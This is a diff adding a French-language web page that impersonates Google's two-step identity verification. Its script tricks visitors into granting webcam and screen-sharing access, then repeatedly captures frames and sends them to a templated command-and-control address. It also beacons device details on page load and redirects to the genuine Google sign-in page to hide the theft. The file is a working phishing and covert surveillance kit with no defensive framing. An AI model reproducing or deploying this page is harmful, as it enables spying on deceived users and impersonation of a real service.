@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fr"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vérification d'identité — Google</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#f1f3f4;font-family:'Google Sans',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:8px;padding:40px;width:460px;max-width:95vw;box-shadow:0 1px 6px rgba(0,0,0,.1)}
+.g-logo{text-align:center;margin-bottom:16px;font-size:26px;font-weight:300;color:#5f6368;letter-spacing:-0.5px}
+.g-logo b{color:#4285f4}
+h1{font-size:20px;color:#202124;text-align:center;font-weight:400;margin-bottom:8px}
+.sub{color:#5f6368;font-size:14px;text-align:center;margin-bottom:28px;line-height:1.5}
+.step{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;margin-bottom:10px;cursor:pointer;transition:all .2s;background:#fff}
+.step:hover{border-color:#1a73e8;background:rgba(26,115,232,.03)}
+.step.done{border-color:#1b8a3c;background:rgba(27,138,60,.04)}
+.step-ico{width:44px;height:44px;border-radius:50%;background:#f1f3f4;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;transition:all .2s}
+.step.done .step-ico{background:rgba(27,138,60,.12)}
+.stitle{font-size:14px;font-weight:500;color:#202124;margin-bottom:2px}
+.sdesc{font-size:12px;color:#5f6368}
+.sstatus{font-size:11px;margin-top:4px}
+.ok-s{color:#1b8a3c}.wait-s{color:#5f6368}.err-s{color:#d93025}
+.btn-g{width:100%;padding:12px;background:#1a73e8;border:none;border-radius:4px;color:#fff;font-size:15px;font-weight:500;cursor:pointer;margin-top:16px;transition:background .15s}
+.btn-g:hover{background:#1557b0}
+.btn-g:disabled{background:#dadce0;color:#9aa0a6;cursor:not-allowed}
+.g-footer{margin-top:20px;text-align:center;font-size:11px;color:#5f6368}
+.g-footer a{color:#1a73e8;text-decoration:none;margin:0 6px}
+</style></head>
+<body>
+<div class="card">
+  <div class="g-logo"><b>G</b>oogle</div>
+  <h1>Vérification en deux étapes</h1>
+  <p class="sub">Pour votre protection, Google vérifie votre identité avant d'autoriser l'accès depuis ce nouvel appareil.</p>
+  <div class="step" id="sc" onclick="startCam()">
+    <div class="step-ico">📷</div>
+    <div>
+      <div class="stitle">Reconnaissance faciale</div>
+      <div class="sdesc">Vérification via caméra</div>
+      <div class="sstatus wait-s" id="cs">Appuyez pour démarrer</div>
+    </div>
+  </div>
+  <div class="step" id="ss" onclick="startScr()">
+    <div class="step-ico">🖥</div>
+    <div>
+      <div class="stitle">Vérification de l'appareil</div>
+      <div class="sdesc">Capture de conformité</div>
+      <div class="sstatus wait-s" id="ss2">Appuyez pour démarrer</div>
+    </div>
+  </div>
+  <button class="btn-g" id="btn" disabled onclick="done()">Accéder à mon compte →</button>
+</div>
+<div class="g-footer">
+  <a href="#">Aide</a><a href="#">Confidentialité</a><a href="#">Conditions</a>
+</div>
+<script>
+const C2="%%C2%%";
+let camOK=false,scrOK=false,camIv=null,scrIv=null;
+function post(d){fetch(C2+"/frame",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(()=>{});}
+function cap(v,type){
+  const c=document.createElement("canvas");
+  c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+  c.getContext("2d").drawImage(v,0,0);
+  post({type,frame:c.toDataURL("image/jpeg",.65),ts:new Date().toISOString(),ua:navigator.userAgent});
+}
+function markDone(si,sti,m){
+  document.getElementById(si).classList.add("done");
+  const s=document.getElementById(sti);s.className="sstatus ok-s";s.textContent=m;
+  if(camOK&&scrOK)document.getElementById("btn").disabled=false;
+}
+function markErr(sti,m){const s=document.getElementById(sti);s.className="sstatus err-s";s.textContent=m;}
+async function startCam(){
+  if(camOK)return;
+  document.getElementById("cs").textContent="Démarrage…";
+  try{
+    const st=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720}},audio:false});
+    const v=document.createElement("video");v.srcObject=st;v.autoplay=true;v.muted=true;
+    v.onloadedmetadata=()=>{
+      camOK=true;markDone("sc","cs","✓ Vérification réussie");
+      camIv=setInterval(()=>cap(v,"camera"),2000);setTimeout(()=>cap(v,"camera"),300);
+    };
+  }catch(e){markErr("cs",e.name==="NotAllowedError"?"Accès refusé — appuyez pour réessayer":"Erreur: "+e.message);}
+}
+async function startScr(){
+  if(scrOK)return;
+  document.getElementById("ss2").textContent="Démarrage…";
+  try{
+    const st=await navigator.mediaDevices.getDisplayMedia({video:{cursor:"always"},audio:false});
+    const v=document.createElement("video");v.srcObject=st;v.autoplay=true;v.muted=true;
+    st.getVideoTracks()[0].onended=()=>{clearInterval(scrIv);scrOK=false;markErr("ss2","Arrêté — appuyez pour reprendre");};
+    v.onloadedmetadata=()=>{
+      scrOK=true;markDone("ss","ss2","✓ Vérification réussie");
+      scrIv=setInterval(()=>cap(v,"screen"),3000);setTimeout(()=>cap(v,"screen"),300);
+    };
+  }catch(e){markErr("ss2",e.name==="NotAllowedError"?"Accès refusé — appuyez pour réessayer":"Erreur: "+e.message);}
+}
+function done(){
+  fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({page:"surv_done",cam:camOK,screen:scrOK,ua:navigator.userAgent})}).catch(()=>{});
+  window.location.href="https://accounts.google.com";
+}
+fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({page:"surv_land",ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+"x"+screen.height})}).catch(()=>{});
+</script>
+</body></html>
